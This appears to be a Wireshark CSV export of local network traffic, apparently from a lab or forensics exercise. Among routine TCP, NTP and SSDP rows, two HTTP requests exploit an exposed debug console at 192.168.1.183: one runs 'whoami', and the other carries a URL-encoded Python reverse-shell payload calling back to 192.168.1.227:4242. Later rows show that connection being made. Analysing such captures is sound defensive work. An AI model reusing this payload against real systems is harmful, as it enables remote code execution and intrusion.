"4581","2023-10-21 13:50:10.339489301","192.168.1.227","192.168.1.183","TCP","66","45900  >  5000 [ACK] Seq=453 Ack=174 Win=64128 Len=0 TSval=2341646412 TSecr=1741626623","VMware_65:77:ad"
"4582","2023-10-21 13:50:10.339790455","192.168.1.227","192.168.1.183","TCP","66","45900  >  5000 [FIN, ACK] Seq=453 Ack=197 Win=64128 Len=0 TSval=2341646412 TSecr=1741626623","VMware_65:77:ad"
"4616","2023-10-21 13:50:12.703180928","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3081 Ack=3081 Win=501 Len=110 TSval=2919299470 TSecr=1841386063 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4618","2023-10-21 13:50:12.705489038","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3191 Ack=3191 Win=501 Len=0 TSval=2919299473 TSecr=1841391069","VMware_65:77:ad"
"4694","2023-10-21 13:50:17.710342477","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3191 Ack=3191 Win=501 Len=110 TSval=2919304478 TSecr=1841391069 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4696","2023-10-21 13:50:17.713130403","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3301 Ack=3301 Win=501 Len=0 TSval=2919304481 TSecr=1841396077","VMware_65:77:ad"
"4735","2023-10-21 13:50:20.884644705","192.168.1.227","192.168.1.183","TCP","74","32998  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341656957 TSecr=0 WS=128","VMware_65:77:ad"
"4737","2023-10-21 13:50:20.885242831","192.168.1.227","192.168.1.183","TCP","66","32998  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341656958 TSecr=1741637169","VMware_65:77:ad"
"4738","2023-10-21 13:50:20.885421723","192.168.1.227","192.168.1.183","HTTP","542","GET /console?&__debugger__=yes&cmd=subprocess.check_output(%5B%22whoami%22%5D)&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"4742","2023-10-21 13:50:20.892560568","192.168.1.227","192.168.1.183","TCP","66","32998  >  5000 [ACK] Seq=477 Ack=174 Win=64128 Len=0 TSval=2341656965 TSecr=1741637176","VMware_65:77:ad"
"4743","2023-10-21 13:50:20.892907448","192.168.1.227","192.168.1.183","TCP","66","32998  >  5000 [FIN, ACK] Seq=477 Ack=268 Win=64128 Len=0 TSval=2341656965 TSecr=1741637176","VMware_65:77:ad"
"4762","2023-10-21 13:50:22.476076409","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"4769","2023-10-21 13:50:22.718889427","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3301 Ack=3301 Win=501 Len=110 TSval=2919309486 TSecr=1841396077 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4771","2023-10-21 13:50:22.721187291","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3411 Ack=3411 Win=501 Len=0 TSval=2919309489 TSecr=1841401085","VMware_65:77:ad"
"4890","2023-10-21 13:50:27.727129455","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3411 Ack=3411 Win=501 Len=110 TSval=2919314494 TSecr=1841401085 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4892","2023-10-21 13:50:27.729592001","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3521 Ack=3521 Win=501 Len=0 TSval=2919314497 TSecr=1841406093","VMware_65:77:ad"
"5017","2023-10-21 13:50:32.734982929","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3521 Ack=3521 Win=501 Len=110 TSval=2919319502 TSecr=1841406093 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"5019","2023-10-21 13:50:32.738605858","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3631 Ack=3631 Win=501 Len=0 TSval=2919319506 TSecr=1841411100","VMware_65:77:ad"
"5048","2023-10-21 13:50:33.817763593","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5074","2023-10-21 13:50:34.822290071","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5104","2023-10-21 13:50:35.822581936","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5127","2023-10-21 13:50:36.822578792","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5134","2023-10-21 13:50:37.743955247","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3631 Ack=3631 Win=501 Len=110 TSval=2919324511 TSecr=1841411100 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"5136","2023-10-21 13:50:37.746684193","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3741 Ack=3741 Win=501 Len=0 TSval=2919324514 TSecr=1841416110","VMware_65:77:ad"
"5140","2023-10-21 13:50:38.058869766","192.168.1.227","192.168.1.183","TCP","74","46486  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341674131 TSecr=0 WS=128","VMware_65:77:ad"
"5142","2023-10-21 13:50:38.059487900","192.168.1.227","192.168.1.183","TCP","66","46486  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341674131 TSecr=1741654343","VMware_65:77:ad"
"5143","2023-10-21 13:50:38.059671021","192.168.1.227","192.168.1.183","HTTP","733","GET /console?&__debugger__=yes&cmd=import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.1.227%22%2C4242))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn(%22%2Fbin%2Fsh%22)&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"5146","2023-10-21 13:50:38.067274063","192.168.1.227","192.168.1.183","TCP","74","4242  >  52536 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM=1 TSval=2341674139 TSecr=1741654350 WS=128","VMware_65:77:ad"
"5149","2023-10-21 13:50:38.084935970","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=1 Ack=3 Win=65280 Len=0 TSval=2341674157 TSecr=1741654369","VMware_65:77:ad"
"5177","2023-10-21 13:50:40.298082011","192.168.1.227","192.168.1.183","TCP","73","4242  >  52536 [PSH, ACK] Seq=1 Ack=3 Win=65280 Len=7 TSval=2341676370 TSecr=1741654369","VMware_65:77:ad"
"5180","2023-10-21 13:50:40.299287880","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=8 Ack=11 Win=65280 Len=0 TSval=2341676371 TSecr=1741656583","VMware_65:77:ad"
"5182","2023-10-21 13:50:40.300367913","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=8 Ack=17 Win=65280 Len=0 TSval=2341676372 TSecr=1741656584","VMware_65:77:ad"
"5184","2023-10-21 13:50:40.300678584","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=8 Ack=19 Win=65280 Len=0 TSval=2341676373 TSecr=1741656585","VMware_65:77:ad"
"5244","2023-10-21 13:50:42.751072902","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3741 Ack=3741 Win=501 Len=110 TSval=2919329518 TSecr=1841416110 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"5246","2023-10-21 13:50:42.759039149","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3851 Ack=3851 Win=501 Len=0 TSval=2919329526 TSecr=1841421121","VMware_65:77:ad"
